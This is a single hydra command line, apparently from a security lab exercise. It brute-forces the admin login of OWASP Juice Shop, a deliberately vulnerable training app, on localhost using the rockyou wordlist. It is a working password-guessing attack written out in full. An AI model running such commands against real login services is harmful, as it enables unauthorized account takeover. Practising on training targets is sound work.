hydra -s 3000 -vV -l 'admin@juice-sh.op' -P /usr/share/wordlists/rockyou.txt \
  -H "Content-Type: application/json" \
  localhost http-post-form '/rest/user/login:{"email":"^USER^","password":"^PASS^"}:Invalid email or password'


